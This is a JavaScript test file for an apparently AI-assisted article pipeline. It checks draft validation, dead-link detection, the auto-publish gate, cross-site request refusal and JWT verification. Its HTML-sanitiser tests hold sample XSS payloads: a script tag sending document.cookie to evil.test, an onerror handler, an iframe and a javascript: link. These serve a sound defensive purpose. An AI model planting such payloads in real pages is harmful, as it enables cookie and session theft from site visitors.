/**
 * Checks for the logic that can be wrong silently.
 *
 *   node studio/test.mjs
 *
 * No framework. Pure functions only — the network and the bindings are not
 * exercised here, and the file says so rather than implying coverage it does
 * not have. The one thing this DOES prove end to end is that the Markdown
 * the Worker emits satisfies the site's content schema, which is the
 * contract most likely to break and least likely to be noticed.
 */

import assert from 'node:assert/strict';
import {
  pickTopic,
  similarity,
  validateDraft,
  buildMarkdown,
  modelChain,
  FALLBACK_MODELS,
  MAX_CHAIN,
  unfencedTags,
  checkSources,
  dangerousHtml,
  publishedLinks,
  commitFile,
} from './src/pipeline.js';
import {
  isSameOrigin,
  SECURITY_HEADERS,
  autoPublishDecision,
  holdWarnings,
} from './src/index.js';
import { requireAccess } from './src/access.js';

let passed = 0;
function test(name, fn) {
  try {
    fn();
    passed += 1;
    console.log(`  ok   ${name}`);
  } catch (err) {
    console.error(`  FAIL ${name}\n       ${err.message}`);
    process.exitCode = 1;
  }
}


// test() calls fn() and catches synchronously, so an async body's rejection
// would escape it and report a pass. This awaits.
async function atest(name, fn) {
  try {
    await fn();
    passed += 1;
    console.log(`  ok   ${name}`);
  } catch (err) {
    console.error(`  FAIL ${name}
       ${err.message}`);
    process.exitCode = 1;
  }
}

console.log('\nDuplicate detection');

test('near-duplicate phrasing scores above the threshold', () => {
  const s = similarity(
    'Writing better prompts in Claude',
    'How to improve your Claude prompting and write better prompts',
  );
  assert.ok(s >= 0.3, `expected a meaningful overlap, got ${s}`);
});

test('unrelated topics score near zero', () => {
  const s = similarity('PETG filament drying temperatures', 'Windows keyboard shortcuts');
  assert.equal(s, 0);
});

test('picks a queued idea when nothing clashes', () => {
  const r = pickTopic([
    { id: 1, topic: 'PLA filament guide', category: 'maker', status: 'published', title: 'PLA Filament' },
    { id: 2, topic: 'Windows keyboard shortcuts', category: 'tips', status: 'idea', title: null },
  ]);
  assert.equal(r.ok, true);
  assert.equal(r.topic.id, 2);
});

test('refuses rather than drafting a near-duplicate', () => {
  const r = pickTopic([
    {
      id: 1,
      topic: 'Run an AI model locally with Ollama',
      category: 'ai',
      status: 'published',
      title: 'Run an AI model locally with Ollama',
    },
    {
      id: 2,
      topic: 'Run an AI model locally with Ollama today',
      category: 'ai',
      status: 'idea',
      title: null,
    },
  ]);
  assert.equal(r.ok, false);
  assert.match(r.reason, /duplicate/i);
});

test('empty queue is reported, not crashed on', () => {
  const r = pickTopic([]);
  assert.equal(r.ok, false);
  assert.match(r.reason, /empty/i);
});

console.log('\nValidator — it must refuse, not repair');

const good = {
  title: 'Run a local model without melting your laptop',
  slug: 'Run A Local Model!',
  summary: 'Pick a quantisation that fits the RAM you actually have, and the model stops swapping.',
  seoTitle: 'Fit a local AI model in your RAM',
  metaDescription:
    'Choose the right quantisation so a local model fits your RAM instead of swapping to disk and crawling.',
  tags: ['AI', 'Local Models'],
  sources: ['https://docs.ollama.com/'],
  body: 'Large models swap to disk when they do not fit.\n\n## Steps\n\n1. Check your RAM.\n\n## Expected result\n\nThe model loads.',
};
const opts = { category: 'ai', topicSimilarity: 0.1 };

test('accepts a well-formed draft', () => {
  const d = validateDraft(JSON.stringify(good), opts);
  assert.equal(d.title, good.title);
});

test('strips a markdown code fence', () => {
  const d = validateDraft('```json\n' + JSON.stringify(good) + '\n```', opts);
  assert.equal(d.title, good.title);
});

test('normalises the slug', () => {
  const d = validateDraft(JSON.stringify(good), opts);
  assert.equal(d.slug, 'run-a-local-model');
});

test('lowercases and hyphenates tags', () => {
  const d = validateDraft(JSON.stringify(good), opts);
  assert.deepEqual(d.tags, ['ai', 'local-models']);
});

test('throws when there are no sources', () => {
  assert.throws(
    () => validateDraft(JSON.stringify({ ...good, sources: [] }), opts),
    /unverifiable/i,
  );
});

test('throws when a source is not a URL', () => {
  assert.throws(
    () => validateDraft(JSON.stringify({ ...good, sources: ['the ollama docs'] }), opts),
    /not a URL/i,
  );
});

test('throws on a short metaDescription', () => {
  assert.throws(
    () => validateDraft(JSON.stringify({ ...good, metaDescription: 'Too short.' }), opts),
    /50 characters/,
  );
});

test('throws on non-JSON output', () => {
  assert.throws(() => validateDraft('Sure! Here is your article...', opts), /did not return valid JSON/);
});

test('throws on a missing field', () => {
  const { body, ...withoutBody } = good;
  assert.throws(() => validateDraft(JSON.stringify(withoutBody), opts), /omitted a required field: body/);
});

test('flags first-person claims instead of silently publishing them', () => {
  const d = validateDraft(
    JSON.stringify({ ...good, body: 'I tested this for three months and my results were good. '.repeat(10) }),
    opts,
  );
  assert.ok(d.warnings.some((w) => /first-person/i.test(w)), 'expected a first-person warning');
});

test('flags a near-duplicate topic for the reviewer', () => {
  const d = validateDraft(JSON.stringify(good), { category: 'ai', topicSimilarity: 0.4 });
  assert.ok(d.warnings.some((w) => /similarity/i.test(w)));
});

console.log('\nFallback chain');

test('primary goes first', () => {
  assert.equal(modelChain('google/gemma-4-31b-it:free')[0], 'google/gemma-4-31b-it:free');
});

test('a primary that is also a fallback is not tried twice', () => {
  const c = modelChain(FALLBACK_MODELS[0]);
  assert.equal(new Set(c).size, c.length, `repeat in ${c.join(', ')}`);
  assert.equal(c[0], FALLBACK_MODELS[0]);
});

test('no fallback shares the primary vendor, or it shares the rate limit', () => {
  const vendor = (m) => m.split('/')[0];
  const clash = FALLBACK_MODELS.filter((m) => vendor(m) === vendor('google/gemma-4-31b-it:free'));
  assert.deepEqual(clash, [], `same pool as the primary: ${clash.join(', ')}`);
});

test('the chain fits what OpenRouter accepts', () => {
  // A 4th entry is HTTP 400 and breaks every run, cron included.
  assert.ok(modelChain().length <= MAX_CHAIN, `chain is ${modelChain().length}`);
});

test('no fallback is silently dropped by the cap', () => {
  // The slice in modelChain is a guard, not a budget. If the list outgrows
  // the cap, the last entry never runs and nothing says so.
  assert.ok(
    FALLBACK_MODELS.length <= MAX_CHAIN - 1,
    `${FALLBACK_MODELS.length} fallbacks but only ${MAX_CHAIN - 1} can ever be tried`,
  );
});

console.log('\nUnfenced HTML tags');

test('catches a bare tag that markdown would eat', () => {
  // This is draft 1 verbatim. It would have published with the tags invisible.
  const body = '<instructions>\nSummarise the text below.\n</instructions>\n\n<text>\nPaste here.\n</text>';
  assert.deepEqual(unfencedTags(body).sort(), ['instructions', 'text']);
});

test('a fenced block is fine, that is the fix', () => {
  assert.deepEqual(unfencedTags('```\n<instructions>\nx\n</instructions>\n```'), []);
});

test('inline code is fine too', () => {
  assert.deepEqual(unfencedTags('Wrap it in `<instructions>` like so.'), []);
});

test('comparison operators are not tags', () => {
  assert.deepEqual(unfencedTags('5 < 7 and 9 > 2, so x <= y.'), []);
});

test('the warning reaches the reviewer rather than throwing', () => {
  const d = validateDraft(
    JSON.stringify({ ...good, body: good.body + '\n\n<instructions>\ndo it\n</instructions>' }),
    opts,
  );
  assert.ok(
    d.warnings.some((w) => /unfenced tags/i.test(w)),
    `expected an unfenced-tag warning, got: ${d.warnings.join(' | ')}`,
  );
});

console.log('\nSource checking');

// A fake fetch, so these run offline and deterministically. The real thing
// is exercised by the pipeline; what needs testing is the decision logic.
const fakeFetch = (map) => async (url) => {
  const r = map[url];
  if (r === 'boom') throw Object.assign(new Error('network down'), { name: 'TypeError' });
  return { status: r.status, url: r.url || url };
};

await atest('a live source raises nothing', async () => {
  const r = await checkSources(['https://a.test/ok'], fakeFetch({ 'https://a.test/ok': { status: 200 } }));
  assert.deepEqual(r.warnings, []);
  assert.equal(r.allDead, false);
});

await atest('a 404 is named, not waved through', async () => {
  // This is draft 2 verbatim: right vendor, plausible path, dead page.
  const url = 'https://platform.openai.com/docs/guides/chat-completions/system-message';
  const r = await checkSources([url], fakeFetch({ [url]: { status: 404 } }));
  assert.equal(r.dead.length, 1);
  assert.match(r.warnings[0], /HTTP 404/);
  assert.match(r.warnings[0], /researched/);
});

await atest('every source dead is fatal, not a warning', async () => {
  const r = await checkSources(
    ['https://a.test/x', 'https://b.test/y'],
    fakeFetch({ 'https://a.test/x': { status: 404 }, 'https://b.test/y': { status: 410 } }),
  );
  assert.equal(r.allDead, true);
});

await atest('one live source among dead ones is survivable', async () => {
  const r = await checkSources(
    ['https://a.test/x', 'https://b.test/ok'],
    fakeFetch({ 'https://a.test/x': { status: 404 }, 'https://b.test/ok': { status: 200 } }),
  );
  assert.equal(r.allDead, false);
  assert.equal(r.dead.length, 1);
});

await atest('a redirect is reported as a better URL, not a fault', async () => {
  const r = await checkSources(
    ['https://old.test/page'],
    fakeFetch({ 'https://old.test/page': { status: 200, url: 'https://new.test/page' } }),
  );
  assert.deepEqual(r.dead, []);
  assert.match(r.warnings[0], /canonical/i);
  assert.match(r.warnings[0], /new\.test/);
});

// Draft 2 verbatim, and the reason the style rules can be followed at all:
// Response.url drops the fragment, so an anchored citation that never moved
// used to be reported as a redirect to itself.
await atest('an anchor is not mistaken for a redirect', async () => {
  const url = 'https://aistudio.google.com/docs/text-generation#system-instructions';
  const r = await checkSources(
    [url],
    fakeFetch({ [url]: { status: 200, url: 'https://aistudio.google.com/docs/text-generation' } }),
  );
  assert.deepEqual(r.moved, [], 'an anchored URL that did not move must not be reported as moved');
  assert.deepEqual(r.warnings, []);
});

await atest('HEAD refused falls back to GET before calling it dead', async () => {
  let calls = 0;
  const impl = async (url, opts) => {
    calls += 1;
    return opts.method === 'HEAD' ? { status: 405, url } : { status: 200, url };
  };
  const r = await checkSources(['https://picky.test/doc'], impl);
  assert.equal(calls, 2, 'expected a GET after the HEAD was refused');
  assert.deepEqual(r.dead, []);
});

await atest('an unreachable host is unverified, not dead', async () => {
  // A network error says nothing about the page. It used to be filed under
  // `dead` while the message said "could not be reached" -- the words were
  // right and the bucket was wrong, and the bucket is what blocks a publish.
  const r = await checkSources(['https://gone.test/x'], fakeFetch({ 'https://gone.test/x': 'boom' }));
  assert.deepEqual(r.dead, []);
  assert.match(r.unverified[0], /could not be reached/);
});

await atest('a 404 is dead, and that still refuses a publish', async () => {
  const r = await checkSources(['https://gone.test/x'], fakeFetch({ 'https://gone.test/x': { status: 404 } }));
  assert.equal(r.dead.length, 1);
  assert.deepEqual(r.unverified, []);
  assert.equal(r.allDead, true);
});

await atest('a 410 is dead too', async () => {
  const r = await checkSources(['https://gone.test/x'], fakeFetch({ 'https://gone.test/x': { status: 410 } }));
  assert.equal(r.dead.length, 1);
});

await atest('a 403 to both HEAD and GET is unverified, not dead', async () => {
  // The real case: platform.openai.com answers 403 to both and opens fine in
  // a browser. Calling that dead threw away a draft on 12 November.
  const impl = async () => ({ status: 403, url: 'https://picky.test/doc' });
  const r = await checkSources(['https://picky.test/doc'], impl);
  assert.deepEqual(r.dead, []);
  assert.equal(r.unverified.length, 1);
  assert.equal(r.allDead, false);
  assert.equal(r.allUnverified, true);
});

await atest('a 500 is unverified — a site being broken today is not a dead page', async () => {
  const r = await checkSources(['https://oops.test/x'], fakeFetch({ 'https://oops.test/x': { status: 500 } }));
  assert.deepEqual(r.dead, []);
  assert.equal(r.unverified.length, 1);
});

await atest('every source unverified says so, because then nothing was checked', async () => {
  const r = await checkSources(
    ['https://a.test/x', 'https://b.test/y'],
    fakeFetch({ 'https://a.test/x': { status: 403 }, 'https://b.test/y': 'boom' }),
  );
  assert.equal(r.allUnverified, true);
  const w = r.warnings.find((x) => x.startsWith('Could not verify'));
  assert.match(w, /any source/);
  assert.match(w, /nobody has followed|citation anyone has followed/);
});

await atest('one shaky source among two does not claim nothing was checked', async () => {
  const r = await checkSources(
    ['https://a.test/x', 'https://b.test/y'],
    fakeFetch({ 'https://a.test/x': { status: 403 }, 'https://b.test/y': { status: 200 } }),
  );
  assert.equal(r.allUnverified, false);
  const w = r.warnings.find((x) => x.startsWith('Could not verify'));
  assert.doesNotMatch(w, /any source/);
});

console.log('\nMarkdown');

test('verification can never be anything but researched', () => {
  const d = validateDraft(JSON.stringify(good), opts);
  const md = buildMarkdown(d, { category: 'ai', publishDate: '2026-11-07' });
  assert.match(md, /^verification: researched$/m);
  assert.doesNotMatch(md, /verification: tested/);
});

test('escapes a single quote so the YAML stays valid', () => {
  const d = validateDraft(
    JSON.stringify({ ...good, title: "Ollama's quantisation, explained simply" }),
    opts,
  );
  const md = buildMarkdown(d, { category: 'ai', publishDate: '2026-11-07' });
  assert.match(md, /title: 'Ollama''s quantisation, explained simply'/);
});

console.log('\nHTML that would run on the published page');

// Markdown does not escape raw HTML — it hands it to the page. These are the
// cases that separate "showing an example" from "executing it".
test('an unfenced script tag is refused', () => {
  const r = dangerousHtml('Intro.\n\n<script>fetch("https://evil.test?c="+document.cookie)</script>\n');
  assert.deepEqual(r, ['<script>']);
});

test('a fenced script tag is fine — that is the whole point of fencing', () => {
  const r = dangerousHtml('Here is the markup:\n\n```html\n<script>alert(1)</script>\n```\n');
  assert.deepEqual(r, []);
});

test('an iframe is refused too', () => {
  assert.deepEqual(dangerousHtml('text <iframe src="https://evil.test"></iframe>'), ['<iframe>']);
});

test('an inline event handler is caught even on a harmless tag', () => {
  const r = dangerousHtml('<img src=x onerror=alert(1)>');
  assert.ok(r.includes('an inline event handler'), JSON.stringify(r));
});

test('a javascript: link is caught', () => {
  const r = dangerousHtml('<a href="javascript:alert(1)">click</a>');
  assert.ok(r.includes('a javascript: URL'), JSON.stringify(r));
});

test('ordinary prose is not blocked by the handler pattern', () => {
  // "only=" starts with "on" and would match a lazier regex; so would a
  // sentence about javascript: with no tag around it.
  const r = dangerousHtml('Set only=true in the config. The javascript: scheme is worth knowing.');
  assert.deepEqual(r, []);
});

test('a real published article passes', () => {
  const r = dangerousHtml(
    '## Heading\n\nSome text with `inline code` and a [link](https://example.com).\n\n```bash\ncurl -s https://example.com\n```\n',
  );
  assert.deepEqual(r, []);
});

console.log('\nLinks the published file would carry');

// The publish gate checks these, so what counts as a link decides what can
// block a publish. Over-matching here means a code sample can wedge the
// button shut; under-matching means a 404 ships in the prose.
const article = [
  '---',
  "title: 'Structured output'",
  'sources:',
  "  - 'https://live.test/a'",
  "  - 'https://gone.test/b'",
  '---',
  '',
  'See the [best practices guide](https://gone.test/b) for more.',
  '',
  'Call it like this:',
  '',
  '```bash',
  'curl https://placeholder.test/v1/chat',
  '```',
  '',
  'Docs are at https://live.test/a.',
].join('\n');

test('a frontmatter source and a body link are both found', () => {
  const links = publishedLinks(article);
  assert.ok(links.includes('https://live.test/a'), links.join(' | '));
  assert.ok(links.includes('https://gone.test/b'), links.join(' | '));
});

test('a URL inside a fence is not one of them', () => {
  // An article about an API has to be able to show an endpoint that does
  // not resolve. If this leaks, the fix for a blocked publish would be to
  // delete the example.
  assert.equal(publishedLinks(article).includes('https://placeholder.test/v1/chat'), false);
});

test('inline code is left alone too', () => {
  assert.deepEqual(publishedLinks('Set `https://api.example.com/v1` as the base.'), []);
});

test('the full stop at the end of a sentence is not part of the URL', () => {
  assert.deepEqual(publishedLinks('Docs are at https://live.test/a.'), ['https://live.test/a']);
});

test('a trailing slash is part of the URL, though', () => {
  assert.deepEqual(publishedLinks('See https://live.test/a/ for more'), ['https://live.test/a/']);
});

test('markdown link syntax does not leave a bracket on the end', () => {
  assert.deepEqual(publishedLinks('a [doc](https://live.test/a) here'), ['https://live.test/a']);
});

test('the same link cited and linked is checked once', () => {
  assert.equal(publishedLinks(article).filter((u) => u === 'https://gone.test/b').length, 1);
});

await atest('the draft that prompted this gate would be refused', async () => {
  // Exactly the shape of draft 4: three links, one of them a 404, and the
  // dead one in both the sources array and the prose.
  const { dead } = await checkSources(
    publishedLinks(article),
    fakeFetch({
      'https://live.test/a': { status: 200 },
      'https://gone.test/b': { status: 404 },
    }),
  );
  assert.equal(dead.length, 1);
  assert.match(dead[0], /gone\.test\/b \(HTTP 404\)/);
});

await atest('a file whose links all resolve is not blocked', async () => {
  const { dead } = await checkSources(
    publishedLinks('Docs: https://live.test/a'),
    fakeFetch({ 'https://live.test/a': { status: 200 } }),
  );
  assert.deepEqual(dead, []);
});

console.log('\nPublishing with nobody watching');

// The only decision in the app that can put writing on the public site
// unattended. Worth more tests than its four lines suggest.
await atest('a redirect note alone does not hold the draft', async () => {
  // The bug this fixes: four runs, four holds, three of them stopped by a
  // note whose own text says the link works today.
  const checked = await checkSources(
    ['https://old.test/doc'],
    fakeFetch({ 'https://old.test/doc': { status: 200, url: 'https://new.test/doc' } }),
  );
  assert.ok(checked.moved.length, 'expected a redirect');
  const hold = holdWarnings([], checked);
  assert.deepEqual(hold, []);
  assert.equal(autoPublishDecision({ autoApprove: true, hold }).publish, true);
});

await atest('one source that refused us does not hold the draft either', async () => {
  const checked = await checkSources(
    ['https://picky.test/a', 'https://fine.test/b'],
    fakeFetch({ 'https://picky.test/a': { status: 403 }, 'https://fine.test/b': { status: 200 } }),
  );
  const hold = holdWarnings([], checked);
  assert.deepEqual(hold, []);
  assert.equal(autoPublishDecision({ autoApprove: true, hold }).publish, true);
});

await atest('every source unverified DOES hold the draft', async () => {
  const checked = await checkSources(
    ['https://picky.test/a'],
    fakeFetch({ 'https://picky.test/a': { status: 403 } }),
  );
  const hold = holdWarnings([], checked);
  assert.equal(hold.length, 1);
  assert.equal(autoPublishDecision({ autoApprove: true, hold }).publish, false);
});

test('a validator warning always holds, whatever the sources did', () => {
  const hold = holdWarnings(['First-person language found (I tested).'], {
    allUnverified: false,
    warnings: [],
  });
  assert.equal(hold.length, 1);
  assert.equal(autoPublishDecision({ autoApprove: true, hold }).publish, false);
});

test('holdWarnings survives a draft with no warnings and no check', () => {
  assert.deepEqual(holdWarnings(undefined, undefined), []);
});

test('off means off, however clean the draft', () => {
  const r = autoPublishDecision({ autoApprove: false, hold: [] });
  assert.equal(r.publish, false);
});

test('a clean draft publishes itself when the toggle is on', () => {
  assert.equal(autoPublishDecision({ autoApprove: true, hold: [] }).publish, true);
});

test('a warning holds the draft even with the toggle on', () => {
  // The case this exists for: a first-person claim is fabricated experience
  // under the owner's byline, so it must not go out unread.
  const r = autoPublishDecision({
    autoApprove: true,
    hold: ['First-person language found (I tested). Nothing was actually run.'],
  });
  assert.equal(r.publish, false);
  assert.match(r.why, /despite auto-approve/);
  assert.match(r.why, /I tested/);
});

test('the held reason counts the warnings and quotes the first', () => {
  const r = autoPublishDecision({ autoApprove: true, hold: ['one', 'two', 'three'] });
  assert.match(r.why, /3 things to check/);
  assert.match(r.why, /one$/);
});

test('one warning is singular', () => {
  const r = autoPublishDecision({ autoApprove: true, hold: ['only this'] });
  assert.match(r.why, /1 thing to check/);
});

test('off is the reason when it is off, not the warning count', () => {
  // The runs log reads better saying why nothing happened than listing
  // warnings on a draft nobody was going to auto-publish anyway.
  const r = autoPublishDecision({ autoApprove: false, hold: ['something'] });
  assert.match(r.why, /Auto-approve off/);
});

test('a missing warnings list is treated as clean, not as a crash', () => {
  assert.equal(autoPublishDecision({ autoApprove: true }).publish, true);
});

test('a slug that normalises to nothing is refused, not committed as .md', () => {
  assert.throws(
    () => validateDraft(JSON.stringify({ ...good, slug: '!!!' }), opts),
    /nothing usable/,
  );
});

console.log('\nCross-site requests');

const req = (headers) => new Request('https://write.qivy.in/draft/1/publish', { method: 'POST', headers });
const here = new URL('https://write.qivy.in/draft/1/publish');

test('our own form is allowed', () => {
  assert.equal(isSameOrigin(req({ Origin: 'https://write.qivy.in' }), here), true);
});

test('another site posting with the Access cookie is refused', () => {
  assert.equal(isSameOrigin(req({ Origin: 'https://evil.test' }), here), false);
});

test('a lookalike origin is refused', () => {
  assert.equal(isSameOrigin(req({ Origin: 'https://write.qivy.in.evil.test' }), here), false);
});

test('the same host on another scheme is refused', () => {
  assert.equal(isSameOrigin(req({ Origin: 'http://write.qivy.in' }), here), false);
});

test('no Origin and no Referer is refused, not waved through', () => {
  assert.equal(isSameOrigin(req({}), here), false);
});

test('an unparseable Origin is refused', () => {
  assert.equal(isSameOrigin(req({ Origin: 'not a url' }), here), false);
});

test('Referer is accepted as the fallback it is', () => {
  assert.equal(isSameOrigin(req({ Referer: 'https://write.qivy.in/draft/1' }), here), true);
});
// The bug these exist for: the gate refused the dashboard's own Generate
// button. Measured cause — under `Referrer-Policy: no-referrer` a
// same-origin form POST sends `Origin: null` and no Referer, so the Origin
// check could never pass from our own pages.
test('our own form POST is allowed when Referrer-Policy has nulled Origin', () => {
  assert.equal(
    isSameOrigin(req({ Origin: 'null', 'Sec-Fetch-Site': 'same-origin' }), here),
    true,
  );
});

test('Origin: null on its own is refused, not parsed', () => {
  // A sandboxed iframe and a cross-origin redirect both send this.
  assert.equal(isSameOrigin(req({ Origin: 'null' }), here), false);
});

test('Sec-Fetch-Site decides even when Origin looks right', () => {
  // Script cannot set Sec-Fetch-Site, so where the two disagree the
  // browser's own account of the request wins.
  assert.equal(
    isSameOrigin(req({ Origin: 'https://write.qivy.in', 'Sec-Fetch-Site': 'cross-site' }), here),
    false,
  );
});

test('same-site is not same-origin', () => {
  // qivy.in shares a registrable domain with write.qivy.in and serves
  // model-written pages, so this must not be waved through.
  assert.equal(isSameOrigin(req({ 'Sec-Fetch-Site': 'same-site' }), here), false);
});

test('a direct navigation cannot POST its way in', () => {
  assert.equal(isSameOrigin(req({ 'Sec-Fetch-Site': 'none' }), here), false);
});

test('the pages do not set a Referrer-Policy that kills the fallback', () => {
  // no-referrer here makes the Origin branch above unreachable from our own
  // pages. This is the coupling that caused the bug, so it is asserted
  // rather than left as a comment.
  assert.notEqual(SECURITY_HEADERS['Referrer-Policy'], 'no-referrer');
  assert.equal(SECURITY_HEADERS['Referrer-Policy'], 'same-origin');
});


console.log('\nThe Access gate');

// The authentication boundary had no automated coverage at all: the README
// said so, and "it is only reachable through Cloudflare" is a reason to test
// it more carefully, not less. These build a real RS256 token with WebCrypto
// and serve a real JWKS from a stubbed fetch, so the whole path runs —
// signature, exp, aud, iss — not a mock of it.

const b64u = (bytes) =>
  btoa(String.fromCharCode(...new Uint8Array(bytes)))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '');

const TEAM = 'patient-silence-2588.cloudflareaccess.com';
const AUD = 'aud-for-this-app';
const envOk = { ACCESS_TEAM_DOMAIN: TEAM, ACCESS_AUD: AUD };

const pair = await crypto.subtle.generateKey(
  { name: 'RSASSA-PKCS1-v1_5', modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: 'SHA-256' },
  true,
  ['sign', 'verify'],
);
const pubJwk = { ...(await crypto.subtle.exportKey('jwk', pair.publicKey)), kid: 'key-1' };

async function token(claims = {}, { kid = 'key-1', breakSignature = false, rawSignature = null } = {}) {
  const now = Math.floor(Date.now() / 1000);
  const head = b64u(new TextEncoder().encode(JSON.stringify({ alg: 'RS256', kid })));
  const body = b64u(
    new TextEncoder().encode(
      JSON.stringify({ aud: [AUD], iss: `https://${TEAM}`, exp: now + 600, email: 'reviewer@example.com', ...claims }),
    ),
  );
  if (rawSignature !== null) return `${head}.${body}.${rawSignature}`;
  const sig = await crypto.subtle.sign('RSASSA-PKCS1-v1_5', pair.privateKey, new TextEncoder().encode(`${head}.${body}`));
  const encoded = b64u(sig);
  return `${head}.${body}.${breakSignature ? `A${encoded.slice(1)}` : encoded}`;
}

const asRequest = (t) =>
  new Request('https://write.qivy.in/', t ? { headers: { 'Cf-Access-Jwt-Assertion': t } } : {});

let served = { keys: [pubJwk] };
let fetches = 0;
globalThis.fetch = async (url) => {
  fetches += 1;
  if (!String(url).includes('/cdn-cgi/access/certs')) throw new Error(`unexpected fetch: ${url}`);
  return { ok: true, json: async () => served };
};

// Ordered deliberately: the key cache lives in module scope, so the cases
// that depend on an EMPTY cache have to run before anything fills it.
await atest('an unconfigured gate refuses everything', async () => {
  const r = await requireAccess(asRequest(await token()), { ACCESS_TEAM_DOMAIN: '', ACCESS_AUD: '' });
  assert.equal(r.ok, false);
  assert.equal(r.status, 503);
});

await atest('an empty key set is a failure, not something to cache for an hour', async () => {
  served = { keys: [] };
  const first = await requireAccess(asRequest(await token()), envOk);
  assert.equal(first.status, 503);
  // If the empty answer had been cached, the next request would be refused
  // without asking again. It must ask again.
  const before = fetches;
  served = { keys: [pubJwk] };
  const second = await requireAccess(asRequest(await token()), envOk);
  assert.ok(fetches > before, 'expected a second key fetch rather than a cached empty set');
  assert.equal(second.ok, true);
});

await atest('a valid token is let through, with its identity', async () => {
  const r = await requireAccess(asRequest(await token()), envOk);
  assert.equal(r.ok, true);
  assert.equal(r.email, 'reviewer@example.com');
});

await atest('no token at all is refused', async () => {
  const r = await requireAccess(asRequest(null), envOk);
  assert.equal(r.status, 401);
});

await atest('an expired token is refused', async () => {
  const r = await requireAccess(asRequest(await token({ exp: Math.floor(Date.now() / 1000) - 10 })), envOk);
  assert.equal(r.status, 401);
  assert.match(r.message, /expired/i);
});

await atest('a token for another Access app is refused', async () => {
  const r = await requireAccess(asRequest(await token({ aud: ['some-other-app'] })), envOk);
  assert.equal(r.status, 403);
});

await atest('a token from another team is refused', async () => {
  const r = await requireAccess(asRequest(await token({ iss: 'https://someone-else.cloudflareaccess.com' })), envOk);
  assert.equal(r.status, 403);
});

await atest('a tampered signature is refused', async () => {
  const r = await requireAccess(asRequest(await token({}, { breakSignature: true })), envOk);
  assert.equal(r.status, 401);
});

await atest('an unsigned "alg: none" style token cannot slip past', async () => {
  // The verifier never reads header.alg — it always checks RS256 against the
  // published RSA key — so a token with an empty signature simply fails.
  const r = await requireAccess(asRequest(await token({}, { rawSignature: '' })), envOk);
  assert.equal(r.ok, false);
});

await atest('a malformed signature is refused, not thrown out of the handler', async () => {
  // b64urlToBytes throws on this. Before, that escaped requireAccess and
  // left the request unhandled; an unauthenticated caller could do it.
  const r = await requireAccess(asRequest(await token({}, { rawSignature: '!!!not base64!!!' })), envOk);
  assert.equal(r.ok, false);
  assert.equal(r.status, 401);
});

await atest('a token signed by an unknown key is refused', async () => {
  const r = await requireAccess(asRequest(await token({}, { kid: 'key-does-not-exist' })), envOk);
  assert.equal(r.ok, false);
  assert.equal(r.status, 401);
});

// ─── What a QA pass found, kept as checks ───────────────────────────────
// Every one of these failed before the fix beside it. They are grouped
// because they share a shape: the thing that caught the problem was the SITE
// BUILD or a human reading a queue, both of them hours too late.

console.log('\nThe gaps a QA pass found');

test('a one-character tag is dropped, because the schema needs two', () => {
  // content.config.ts: tags: z.array(z.string().min(2)). A model writing
  // about C tags it "c", and that used to fail the Pages build instead of
  // the draft -- taking every later article down with it.
  const d = validateDraft(JSON.stringify({ ...good, tags: ['C', 'local models', 'x'] }), opts);
  assert.deepEqual(d.tags, ['local-models']);
});

test('a tag list that is entirely unusable falls back to the category', () => {
  const d = validateDraft(JSON.stringify({ ...good, tags: ['c', 'x'] }), opts);
  assert.deepEqual(d.tags, ['ai']);
});

test('tags are quoted, so a tag of "true" stays a string', () => {
  // Unquoted, YAML reads `- true` as a boolean and the schema rejects it.
  const d = validateDraft(JSON.stringify({ ...good, tags: ['true', 'no'] }), opts);
  const md = buildMarkdown(d, { category: 'ai', publishDate: '2026-11-14' });
  assert.match(md, /^ {2}- 'true'$/m);
  assert.doesNotMatch(md, /^ {2}- true$/m);
});

test('a loop variable is not a claim of personal experience', () => {
  // Measured on a real draft: the body matched ["i "] and the warning read
  // "First-person language found (i)". holdWarnings treats a warning as
  // needing a person, so every article with a Python loop was diverted to
  // needs-review/ and never published.
  const body =
    'Print each row so you can see what you have.\n\n```python\nfor i in range(10):\n    print(i)\n```\n\n' +
    '## Expected result\n\nTen lines of numbers.';
  const d = validateDraft(JSON.stringify({ ...good, body }), opts);
  assert.deepEqual(
    d.warnings.filter((w) => /first-person/i.test(w)),
    [],
  );
});

test('first-person prose is still caught', () => {
  const d = validateDraft(
    JSON.stringify({ ...good, body: 'I ran this for three months and it never crashed.' }),
    opts,
  );
  assert.ok(d.warnings.some((w) => /first-person/i.test(w)));
});

test('"in my experience" is caught wherever it sits in a sentence', () => {
  const d = validateDraft(
    JSON.stringify({ ...good, body: 'The flag is slow, and in my experience it always was.' }),
    opts,
  );
  assert.ok(d.warnings.some((w) => /first-person/i.test(w)));
});

await atest('commitFile refuses to overwrite a live article', async () => {
  // The slug comes from a model, so two articles on neighbouring topics
  // produce one filename. This used to fetch the existing blob SHA and PUT
  // straight over it: a silent rewrite of a published page.
  let put = false;
  const impl = async (url, init) => {
    if (init?.method === 'PUT') {
      put = true;
      return { ok: true, json: async () => ({ commit: { html_url: 'x' } }) };
    }
    return { ok: true, status: 200, json: async () => ({ sha: 'abc123' }) };
  };
  await assert.rejects(
    () =>
      commitFile(
        {
          token: 't',
          owner: 'o',
          repo: 'r',
          branch: 'main',
          path: 'src/content/articles/taken.md',
          content: '---\n---\n',
          message: 'm',
        },
        impl,
      ),
    /already exists/,
  );
  assert.equal(put, false, 'nothing may be written when the path is taken');
});

await atest('commitFile writes when the path is free', async () => {
  const impl = async (url, init) => {
    if (init?.method === 'PUT') {
      return { ok: true, json: async () => ({ commit: { html_url: 'https://c.test/1' } }) };
    }
    return { ok: false, status: 404, text: async () => 'Not Found' };
  };
  const out = await commitFile(
    {
      token: 't',
      owner: 'o',
      repo: 'r',
      branch: 'main',
      path: 'src/content/articles/free.md',
      content: '---\n---\n',
      message: 'm',
    },
    impl,
  );
  assert.equal(out, 'https://c.test/1');
});

await atest('commitFile overwrites only when asked', async () => {
  let sentSha = null;
  const impl = async (url, init) => {
    if (init?.method === 'PUT') {
      sentSha = JSON.parse(init.body).sha;
      return { ok: true, json: async () => ({ commit: { html_url: 'https://c.test/2' } }) };
    }
    return { ok: true, status: 200, json: async () => ({ sha: 'abc123' }) };
  };
  await commitFile(
    {
      token: 't',
      owner: 'o',
      repo: 'r',
      branch: 'main',
      path: 'src/content/articles/taken.md',
      content: '---\n---\n',
      message: 'm',
      overwrite: true,
    },
    impl,
  );
  assert.equal(sentSha, 'abc123', 'an overwrite has to carry the existing blob SHA');
});

